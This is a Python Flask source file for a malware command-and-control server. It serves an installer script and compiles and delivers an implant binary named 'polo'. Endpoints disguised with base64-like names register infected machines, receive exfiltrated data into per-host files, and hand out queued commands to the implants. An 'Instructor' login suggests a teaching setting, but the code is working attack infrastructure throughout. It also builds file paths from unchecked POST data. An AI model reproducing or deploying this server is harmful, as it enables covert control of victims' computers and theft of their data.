import functools
import os
import json

from user_agents import parse
from flask import (
    Blueprint, flash, g, redirect, render_template, request, session, url_for, send_from_directory, send_file
)

bp = Blueprint('nartan', __name__)
LOCALHOST = True
MARCO_DIR = os.getcwd()
POLO_DIR = MARCO_DIR + "/../polo/"
if not LOCALHOST:
    EXFIL_DIR = "/root/MarcoPolo/polo/infected/"
    CMD_FILE = "/root/MarcoPolo/polo/infected/cmds.txt"
else:
    EXFIL_DIR = MARCO_DIR + "/../polo/infected/"
    CMD_FILE = MARCO_DIR + "/../polo/cmds.txt"

CONNECTED_IMPLANTS = {}






#Utils
def get_global_commands():
    cmds = []
    with open(CMD_FILE, "r") as f:
        for line in f.readlines():
            cmds.append(line.strip('\n'))

    open(CMD_FILE,"w").close()
    return cmds

def get_per_endpoint(implant):
    cmds = []
    IMPLANT_FILE = EXFIL_DIR + implant + "/cmds.txt"
    with open(IMPLANT_FILE, "r") as f:
        for line in f.readlines():
            cmds.append(line.strip('\n'))

    open(IMPLANT_FILE, "w").close()
    return cmds


@bp.route('/')
def index():
    return render_template('warning.html')

@bp.route('/home', methods=['POST'])
def home():
    name = request.form['key']
    if name == "Instructor":
        return render_template('index.html')
    
    return('', 204)

@bp.route('/download_page')
def download_page():
    # Find OS from User-Agent
    usrA = parse(request.user_agent.string)
    name="gavin"
    return render_template('download.html', name=name, os_fam=usrA.os.family.lower())

@bp.route('/download')
def download():
    print("[*] Sending Installer")
    return send_file(MARCO_DIR + "/static/bin/install.sh", as_attachment=True)

@bp.route('/TW9yZ2VuCg')
def TW9yZ2VuCg():
    print("[*] Compiling Polo from SRC")
    EXECDIR = "g++ " + POLO_DIR + "/src/*.cpp -std=c++11 -lcurl -o " + MARCO_DIR + "/static/bin/polo"
    os.system(EXECDIR)
    return send_file(MARCO_DIR + "/static/bin/polo", as_attachment=True)
    
#Obfuscated endpoint for first contact
#only thing that should be coming through this endpoint is a string along the lines of this
#Marks-iMac.local, vps258357, Mark-PC, etc.
@bp.route('/ZGlyawo/<endpoint>', methods=['POST'])
def ZGlyawo(endpoint):
    post_data = request.get_data().decode('utf-8')
    path = EXFIL_DIR + post_data
    print("[*] Creating Directory: %s" % post_data)
    print("[*] Creating Endpoint: %s" % endpoint)
    CONNECTED_IMPLANTS[endpoint] = post_data 
    print("[*] New Implant Detected\n\t[*] Implant List: %s" % str(CONNECTED_IMPLANTS))
    if not os.path.exists(path):
        os.mkdir(path)
        with open(path + "/cmds.txt", 'w') as fp:
            pass
        
    return('',204)

#Obfuscated endpoint for exfil
@bp.route('/aGF0c3UK', methods=['POST'])
def aGF0c3UK():
    post_data = request.get_data().decode('utf-8')
    dirPath = post_data[0:post_data.find(':')]
    post_data = post_data[(len(dirPath)+ 1):]
    with open(EXFIL_DIR + dirPath + "/exfil.info", "a+") as f:
        print("[*] Implant %s Generated Response:\n\t[*] %s" % (dirPath, str(post_data)))
        f.write(post_data + "\n")

    return('', 204)

#Obfuscated endpoint for retrieval
@bp.route('/R1JOQ2hlZXRhaAo/<endpoint>', methods=['GET'])
def R1JOQ2hlZXRhaAo(endpoint):
    toRet = []
    #Check to see if there are any instructions for all of the implants
    GLOBAL_COMMANDS = get_global_commands()
    toRet = toRet + GLOBAL_COMMANDS
    #Check to see if ther are any instructions for a specific endpoint
    if endpoint is not None:
        try:
            perImplDir = CONNECTED_IMPLANTS[endpoint]
        except KeyError:
            print("[*] Implant we don't currently track attempted to connect to Marco")
            print("\t[*]Endpoint: %s" % endpoint)
            perImplDir = None

        if perImplDir is not None:
            toRet = toRet + get_per_endpoint(perImplDir) 
    if toRet != []:
        print("[*] Commands Generated:\n\t[*] List: %s" % (str(toRet)))
    return (json.dumps(toRet))


@bp.route('/aboutus')
def about_us():
    return render_template('about_us.html')

@bp.errorhandler(404)
def not_found_error(error):
    print("[*] Page Not Found")
    return render_template('', 204)

